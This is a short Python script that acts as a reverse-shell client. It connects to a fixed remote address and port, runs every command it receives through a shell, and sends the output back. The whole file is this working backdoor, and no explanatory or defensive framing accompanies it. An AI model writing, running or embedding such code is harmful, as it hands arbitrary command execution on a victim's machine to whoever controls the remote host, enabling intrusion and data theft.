import os
import socket
import subprocess
import threading
import time

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('10.0.1.33', 9999))  # Replace 'server_ip' with the actual server's IP
    while True:
        try:
            # Receive and execute server commands (e.g., shell commands)
            command = client_socket.recv(1024).decode('utf-8')
            if command == "!exit":
                break
            result = subprocess.run(command, shell=True, capture_output=True)
            client_socket.send(result.stdout + result.stderr)
        except Exception as e:
            client_socket.send(str(e).encode())
    client_socket.close()

# Start the client connection
connect_to_server()
